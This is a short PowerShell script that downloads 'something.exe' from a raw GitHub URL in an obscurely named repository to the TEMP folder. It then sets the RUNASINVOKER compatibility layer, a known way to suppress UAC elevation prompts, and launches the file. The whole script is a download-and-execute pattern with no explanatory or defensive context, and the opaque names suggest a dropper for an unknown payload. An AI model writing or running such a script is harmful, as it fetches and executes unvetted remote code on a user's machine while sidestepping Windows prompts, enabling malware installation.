# Download the executable file
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/something.exe" -OutFile "$env:TEMP\something.exe"

# Set the compatibility layer
$env:__COMPAT_LAYER = "RUNASINVOKER"

# Execute the downloaded executable file
Start-Process "$env:TEMP\something.exe"
